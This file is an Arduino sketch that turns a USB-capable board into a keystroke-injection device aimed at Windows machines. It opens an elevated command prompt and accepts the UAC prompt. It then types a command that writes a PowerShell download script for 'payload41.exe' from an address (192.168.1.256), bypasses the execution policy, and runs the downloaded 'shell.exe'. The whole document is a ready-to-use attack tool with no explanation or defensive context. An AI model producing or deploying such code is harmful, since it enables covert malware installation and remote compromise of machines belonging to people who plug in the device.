#include "Keyboard.h"

void typeKey(int key)
{
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}


void setup()
{

Keyboard.begin();


delay(500);

delay(500);

typeKey(KEY_LEFT_GUI);

delay(300);

Keyboard.print("cmd");

delay(400);

Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_SHIFT);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();

delay(700);

typeKey(KEY_LEFT_ARROW);

delay(350);

typeKey(KEY_RETURN);

delay(300);

Keyboard.print("cd / & cd Windows & echo (wget '192.168.1.256/payload41.exe' -Outfile shell.exe) > download.ps1 & powershell -executionpolicy bypass -file download.ps1 & shell.exe");

delay(400);

typeKey(KEY_RETURN);

delay(300);

Keyboard.print("exit");

delay(200);

typeKey(KEY_RETURN);


Keyboard.end();
}
void loop() {}
